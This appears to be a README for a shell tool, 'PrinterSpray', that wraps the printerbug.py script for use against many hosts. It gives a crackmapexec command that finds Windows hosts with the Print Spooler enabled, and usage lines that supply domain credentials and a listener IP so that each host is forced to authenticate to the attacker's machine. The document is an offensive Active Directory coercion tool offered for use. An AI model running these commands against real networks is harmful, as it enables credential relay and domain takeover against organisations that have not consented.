# PrinterSpray

Wrapper of https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py to be used with a list of IPs. 

Discover potentual targets

```
crackmapexec smb [subnet] -M spooler | grep "Spooler service enabled" | awk -F " " '{print$2}' > spooler.txt
```

Run against hosts that have the spooler service enabled

```
./printerspray.sh -t [targets file] -d [AD domain] -u [username] -p [pwd] -l [listenerIP]
```

Example:

```
./printerspray.sh -t ./spooler.txt -d 'labdomain.local' -u 'ADuser1' -p 'pwd' -l 192.168.1.23
```
